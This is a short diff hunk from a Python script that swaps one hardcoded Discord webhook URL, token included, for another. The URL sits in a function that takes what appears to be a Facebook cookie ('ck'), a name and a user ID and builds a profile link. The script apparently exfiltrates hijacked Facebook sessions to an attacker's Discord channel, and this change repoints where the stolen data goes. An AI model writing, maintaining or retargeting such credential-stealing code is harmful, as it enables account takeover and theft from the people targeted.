@@ -19,7 +19,7 @@ def clr():
 
 def send_webhook(ck, name, uid):
     try:
-        webhook_url = "https://discord.com/api/webhooks/1443279268686856374/ypnYorUiTmJSdPXDEFJeqzhBokUsjUuTGsXodLIBNADmJktvOpugepbs7rZOCrMUYQLr"
+        webhook_url = "https://discord.com/api/webhooks/1445086551469068409/Ip-NGeudN4XS7nBuDlXc0Kb2MtQmhPB15jGAfOt0zQq4h77O3TL0ZXySq6VzOrTyTP4D"
         
         current_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         fb_link = f"https://www.facebook.com/{uid}"
